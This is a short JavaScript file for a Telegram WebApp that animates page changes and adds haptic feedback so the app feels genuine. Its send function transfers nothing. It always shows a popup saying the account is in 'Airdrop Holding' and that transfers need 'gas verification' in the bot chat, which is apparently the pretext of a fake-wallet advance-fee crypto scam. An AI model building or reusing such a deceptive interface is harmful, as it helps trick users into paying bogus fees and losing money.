const tg = window.Telegram.WebApp;
tg.expand();

function showPage(pageId) {
    const current = document.querySelector('.page.active');
    const target = document.getElementById(pageId);

    if (current.id === pageId) return;

    // Trigger Haptic Feedback (feels like a real app)
    tg.HapticFeedback.impactOccurred('medium');

    // Page Animation
    gsap.to(current, { opacity: 0, y: -10, duration: 0.2, onComplete: () => {
        current.classList.remove('active');
        target.classList.add('active');
        gsap.fromTo(target, { opacity: 0, y: 10 }, { opacity: 1, y: 0, duration: 0.4, ease: "back.out(1.7)" });
    }});

    // Update Nav Icons
    document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active'));
    const navId = pageId.replace('page-', 'nav-');
    const navIcon = document.getElementById(navId);
    if (navIcon) navIcon.classList.add('active');
}

function confirmSend() {
    tg.HapticFeedback.notificationOccurred('error');
    tg.showPopup({
        title: 'Network Verification Required',
        message: 'Your account is currently in "Airdrop Holding". To enable external transfers, please complete the gas verification in the bot chat.',
        buttons: [{type: 'close'}]
    });
}

// Initial Entry Animation
gsap.from(".page.active", { opacity: 0, scale: 0.95, duration: 0.6 });
